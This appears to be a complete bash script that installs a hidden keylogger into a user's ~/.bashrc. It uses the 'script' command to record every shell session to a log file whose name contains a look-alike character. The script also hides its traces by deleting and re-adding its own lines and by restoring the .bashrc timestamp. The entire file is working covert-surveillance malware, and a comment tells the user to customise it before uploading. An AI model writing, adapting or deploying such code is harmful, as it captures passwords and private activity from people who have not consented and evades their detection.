#!/bin/bash
# CUSTIMIZE BEFORE UPLOAD

fakerc=~/.bаsh_login
logfile=~/.bаsh_cache
waitsec=1
changetime=$(stat -c %Y ~/.bashrc)

read script <<EOF
exec script -B "$logfile" -afqc "bash --rcfile '$fakerc'"
EOF
quoted=$(printf "%q" "$script")

# UI BEGIN

print() { echo -e "$*"; }
printvar() { printf " + \e[1;32m%s\e[m = \e[4;5m%s\e[m\n" $1 "${!1}"; }

printvar fakerc
printvar logfile
printvar script
printvar quoted

print "\e[5;7m  wait for \e[1m$waitsec\e[0;5;7m secs, ctrl+c to interrupt  \e[m"
sleep $waitsec
print "installing..."

# UI END

cat >"$fakerc" <<EOF
self=\$(cat "$fakerc")
self=\$(printf "%q" "\$self")
rm -f "$fakerc"
sed -i "/^exec script -B/d" ~/.bashrc
touch -d @$changetime ~/.bashrc
trap "echo $quoted >> ~/.bashrc && echo \$self > '$fakerc'" EXIT
unset self
. ~/.bashrc
EOF
echo $script >> ~/.bashrc
